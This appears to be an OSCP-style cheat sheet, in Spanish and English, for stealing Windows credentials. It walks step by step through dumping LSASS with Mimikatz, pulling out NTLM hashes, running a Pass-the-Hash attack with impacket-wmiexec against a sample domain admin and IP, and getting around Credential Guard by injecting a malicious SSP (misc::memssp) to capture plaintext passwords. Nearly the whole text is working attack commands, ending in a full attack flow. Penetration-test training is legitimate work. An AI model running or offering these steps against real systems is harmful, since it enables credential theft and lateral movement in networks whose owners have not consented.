NTLM Hashes, LSASS & Credential Dumping (OSCP Style)

1. Identify Logon Sessions
whoami
whoami /priv

Qué buscas:

  • SeDebugPrivilege (required for Mimikatz)
  • Contexto elevado (Administrator / SYSTEM)
2. Check Running Processes
ps auxf
tasklist

Qué buscas:

  • Proceso lsass.exe
  • Procesos sospechosos o desconocidos
  • Procesos ejecutados como SYSTEM
3. Run Mimikatz
.\mimikatz.exe

Initial setup:

privilege::debug

Qué hace:

  • Habilita SeDebugPrivilege
  • Permite acceso a memoria de LSASS
4. Dump Credentials from LSASS
sekurlsa::logonpasswords

Qué buscas:

  • Usuarios autenticados en el sistema
  • Hashes NTLM en sección msv
  • Credenciales de dominio (ej: CORP\Administrator)
  • Sesiones RDP / RemoteInteractive
5. Extract NTLM Hash

Localiza el hash en la salida:

* NTLM : 160c0b16dd0ee77e7c494e38252f7ddf

Qué hacer:

  • Copiar el hash NTLM del usuario objetivo
  • Identificar si pertenece a un usuario de dominio
  • Usarlo para Pass-the-Hash o cracking
6. Pass-the-Hash Attack
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/USER@TARGET_IP

Ejemplo:

impacket-wmiexec -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248

Qué buscas:

  • Shell remota
  • Ejecución de comandos
  • Acceso sin conocer la contraseña
7. Check for Credential Guard
Get-ComputerInfo

Qué buscar:

  • DeviceGuardSecurityServicesRunning
  • CredentialGuard enabled

Impacto:

  • LSASS ya no contiene hashes en texto accesible
  • Credenciales de dominio aisladas en VTL1
  • Mimikatz no puede extraer hashes directamente
8. Credential Guard Limitation
  • No permite dump de hashes de usuarios de dominio desde LSASS
  • Solo credenciales locales pueden ser accesibles
  • LSAISO protege credenciales en memoria aislada
9. Bypass: Malicious SSP Injection
misc::memssp

Qué hace:

  • Inyecta un Security Support Provider en LSASS
  • Intercepta credenciales en texto plano
  • No depende de leer hashes desde memoria

Output:

  • Credenciales se guardan en:
C:\Windows\System32\mimilsa.log
10. Capture Plaintext Credentials

Después de inyectar SSP, forzar login de usuario:

RDP / SMB / login interactivo

Luego revisar logs:

type C:\Windows\System32\mimilsa.log

Qué buscas:

  • Credenciales en texto plano
  • Usuarios de dominio autenticados
  • Passwords reutilizables
OSCP Attack Flow
  1. Gain admin access
  2. Check privileges (SeDebugPrivilege)
  3. Run Mimikatz
  4. Dump LSASS credentials
  5. Extract NTLM hashes
  6. Use Pass-the-Hash
  7. If blocked by Credential Guard → inject SSP (memssp)
  8. Capture plaintext credentials from logs
